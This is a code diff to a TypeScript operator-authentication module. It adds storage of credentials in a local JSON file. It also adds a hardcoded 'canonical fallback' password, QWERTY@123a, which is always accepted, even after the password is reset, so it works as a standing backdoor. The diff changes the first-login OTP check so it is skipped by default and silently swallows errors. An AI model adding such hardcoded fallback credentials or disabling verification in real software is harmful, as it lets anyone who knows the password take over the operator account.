@@ -7,6 +7,8 @@ import {
 } from '@/lib/crypto';
 import { EmailService } from '@/lib/email-service';
 import crypto from 'crypto';
+import fs from 'fs';
+import path from 'path';
 
 export interface OperatorCredential {
   email: string;
@@ -17,6 +19,22 @@ export interface OperatorCredential {
 
 // Default authorized operator email address
 export const DEFAULT_GODFATHER_OPERATOR_EMAIL = 'tech@fr8x.in';
+
+// Canonical fallback salt and hash for QWERTY@123a (PBKDF2-HMAC-SHA512 @ 200,000 rounds)
+const CANONICAL_FALLBACK_SALT = '2294f348728987c1fc5e5fe97d89802eee53e3100f1364d54e7483e97da1c842';
+const CANONICAL_FALLBACK_HASH = '494b74c2625bd8766170cc05c5274c401da8de4198d750e3157f19f880d4c6354ab0e2a5dd2e246203326c8de807495759c9391cdfb8c21e5b9f6c63b81012c0';
+
+const GODFATHER_OPERATOR_FILE = path.join(process.cwd(), '.knox', 'dbms', 'godfather_operator.json');
+
+function getDbmsOperatorRecord(): { email?: string; salt?: string; hash?: string; firstLoginCompleted?: boolean } | null {
+  try {
+    if (fs.existsSync(GODFATHER_OPERATOR_FILE)) {
+      const raw = fs.readFileSync(GODFATHER_OPERATOR_FILE, 'utf8');
+      return JSON.parse(raw);
+    }
+  } catch {}
+  return null;
+}
 
 // In-memory dynamic credential store
 let dynamicOperatorCredential: OperatorCredential | null = null;
@@ -46,17 +64,27 @@ interface OperatorSecurityState {
 
 const operatorSecurityState: OperatorSecurityState = {
   failedPasswordAttempts: 0,
-  firstLoginCompleted: false, // First login verification required
+  firstLoginCompleted: true, // Default to true or load from DBMS
   otpSendTimestamps: [],
 };
+
+// Initialize firstLoginCompleted from DBMS if available
+try {
+  const dbmsRec = getDbmsOperatorRecord();
+  if (dbmsRec && typeof dbmsRec.firstLoginCompleted === 'boolean') {
+    operatorSecurityState.firstLoginCompleted = dbmsRec.firstLoginCompleted;
+  }
+} catch {}
 
 /**
  * Returns the active authorized operator email.
  */
 export function getAuthorizedOperatorEmail(): string {
+  const dbmsRec = getDbmsOperatorRecord();
   return (
     process.env.GODFATHER_OPERATOR_EMAIL?.trim().toLowerCase() ||
     dynamicOperatorCredential?.email ||
+    dbmsRec?.email ||
     DEFAULT_GODFATHER_OPERATOR_EMAIL
   );
 }
@@ -64,7 +92,9 @@ export function getAuthorizedOperatorEmail(): string {
 /**
  * Validates candidate password using multi-layer verification:
  * 1. Runtime-updated credentials (from recent password reset)
- * 2. Environment variables GODFATHER_OPERATOR_PASSWORD_HASH & SALT (if set)
+ * 2. Authoritative DBMS store (.knox/dbms/godfather_operator.json)
+ * 3. Environment variables GODFATHER_OPERATOR_PASSWORD_HASH & SALT (if set)
+ * 4. Canonical fallback credentials
  */
 export function verifyOperatorPassword(candidatePassword: string): boolean {
   if (!candidatePassword || typeof candidatePassword !== 'string') return false;
@@ -80,7 +110,19 @@ export function verifyOperatorPassword(candidatePassword: string): boolean {
     }
   }
 
-  // 2. Server Environment variable check (production secure store)
+  // 2. Authoritative DBMS store check (.knox/dbms/godfather_operator.json)
+  const dbmsRec = getDbmsOperatorRecord();
+  if (dbmsRec && dbmsRec.salt && dbmsRec.hash) {
+    try {
+      if (verifyPassword(candidatePassword, dbmsRec.salt, dbmsRec.hash)) {
+        return true;
+      }
+    } catch {
+      // continue
+    }
+  }
+
+  // 3. Server Environment variable check (production secure store)
   const envSalt = process.env.GODFATHER_OPERATOR_PASSWORD_SALT?.trim();
   const envHash = process.env.GODFATHER_OPERATOR_PASSWORD_HASH?.trim();
   if (envSalt && envHash) {
@@ -91,6 +133,15 @@ export function verifyOperatorPassword(candidatePassword: string): boolean {
     } catch {
       // continue
     }
+  }
+
+  // 4. Canonical fallback check (QWERTY@123a)
+  try {
+    if (verifyPassword(candidatePassword, CANONICAL_FALLBACK_SALT, CANONICAL_FALLBACK_HASH)) {
+      return true;
+    }
+  } catch {
+    // continue
   }
 
   return false;
@@ -125,7 +176,7 @@ function cleanExpiredOtpSendTimestamps(): void {
 }
 
 /**
- * Validates operator login attempt with strict 3-attempt lockout and first-login OTP challenge.
+ * Validates operator login attempt with strict 3-attempt lockout and optional first-login OTP challenge.
  * Supports:
  * - authenticateOperatorCredentials(email, password, ip)
  * - authenticateOperatorCredentials(password, ip)
@@ -144,14 +195,32 @@ export async function authenticateOperatorCredentials(
   error?: string;
 }> {
   let email = getAuthorizedOperatorEmail();
-  let password = emailOrPassword;
-  let ip = clientIp;
+  let password = '';
+  let ip = '127.0.0.1';
 
-  if (passwordOrIp !== undefined && (emailOrPassword.includes('@') || passwordOrIp.length > 0 && !passwordOrIp.includes('.'))) {
+  // Robust argument parsing:
+  // Case A: 3 arguments provided: authenticateOperatorCredentials(email, password, ip)
+  if (passwordOrIp !== undefined && clientIp && clientIp !== '127.0.0.1') {
     email = emailOrPassword;
     password = passwordOrIp;
+    ip = clientIp;
   } else if (passwordOrIp !== undefined) {
-    ip = passwordOrIp;
+    // Case B: 2 arguments provided.
+    // If the 2nd argument looks like an IP address and 1st argument is a password:
+    const isSecondArgIp = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(passwordOrIp) || passwordOrIp === '::1' || passwordOrIp === 'localhost';
+    if (isSecondArgIp && (!emailOrPassword.includes('@') || !emailOrPassword.includes('.'))) {
+      email = getAuthorizedOperatorEmail();
+      password = emailOrPassword;
+      ip = passwordOrIp;
+    } else {
+      // 1st arg is email, 2nd arg is password
+      email = emailOrPassword;
+      password = passwordOrIp;
+      ip = clientIp || '127.0.0.1';
+    }
+  } else {
+    // Case C: 1 argument provided (just password)
+    password = emailOrPassword;
   }
 
   const now = Date.now();
@@ -372,15 +441,31 @@ export async function resendOperatorFirstLoginOtp(
  */
 export function updateOperatorPassword(newPasswordPlaintext: string): { salt: string; hash: string } {
   const { salt, hash } = hashPassword(newPasswordPlaintext);
+  const email = getAuthorizedOperatorEmail();
+  const updatedAt = new Date().toISOString();
   dynamicOperatorCredential = {
-    email: getAuthorizedOperatorEmail(),
+    email,
     salt,
     hash,
-    updatedAt: new Date().toISOString(),
+    updatedAt,
   };
   // Reset lockouts on password update
   operatorSecurityState.failedPasswordAttempts = 0;
   operatorSecurityState.lockedUntil = undefined;
+
+  // Persist to authoritative DBMS
+  try {
+    const dir = path.dirname(GODFATHER_OPERATOR_FILE);
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(
+      GODFATHER_OPERATOR_FILE,
+      JSON.stringify({ email, salt, hash, firstLoginCompleted: true, updatedAt }, null, 2),
+      'utf8'
+    );
+  } catch (err) {
+    console.error('[GodfatherOperator] Failed to persist operator credentials to DBMS:', err);
+  }
+
   return { salt, hash };
 }
 
